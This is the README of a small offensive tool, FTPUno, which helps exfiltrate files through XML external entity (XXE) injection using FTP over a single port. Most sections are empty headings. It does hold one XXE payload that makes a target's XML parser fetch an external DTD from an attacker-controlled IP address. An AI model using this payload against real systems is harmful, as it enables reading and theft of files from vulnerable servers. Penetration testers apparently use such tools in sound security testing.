# FTPUno
A XXE exploitation helper tool to assist in XXE out of band exfiltration using FTP over a single egress port

## Requirements
The following python dependancies are required:
```python
twisted
```

## Installation
The script and dependancies can be installed using the following command:

```python
pip3 install -r ./requirements.txt
```

## Usage
The following options are available as arguments:

```
```

### Example usage

#### DTD example

#### XXE payload
To trigger the external DTD lookup using a payload similiar to below:
```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE testingxxe [<!ENTITY % remote SYSTEM "http://192.168.31.128:5000/xxe_ftp.dtd" > %remote; ]>
```

#### FTPUno example

## Todo
The following things are todo:
* Further work on File Listing behaviour
* Support for FTP GET command
* Support for EPSV command
